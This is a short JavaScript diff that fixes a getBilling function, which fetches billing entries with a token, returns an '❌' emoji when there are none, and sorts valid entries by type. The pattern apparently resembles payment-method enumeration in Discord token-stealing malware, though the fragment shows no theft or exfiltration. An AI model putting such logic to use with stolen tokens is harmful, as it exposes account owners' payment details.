@@ -493,12 +493,9 @@ const fetchBilling = async (token) => {
 };
 
 const getBilling = async (token) => {
-  let billing = '';
   const data = await fetchBilling(token);
-  var len= arr.length;
-  if (len ==0) {
-    return '❌'
-  }
+  if (!data) return '❌';
+  let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
       switch (x.type) {
